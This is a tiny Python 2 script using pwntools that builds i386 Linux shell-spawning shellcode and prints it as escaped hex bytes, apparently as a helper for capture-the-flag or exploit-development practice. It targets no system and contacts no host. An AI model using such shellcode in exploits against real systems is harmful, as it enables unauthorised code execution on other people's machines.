from pwn import *

shellcode =  asm(shellcraft.i386.linux.sh()).encode('hex')


print ''.join(map(lambda x: '\\x'+shellcode[x:x+2], list(range(0,len(shellcode),2))))

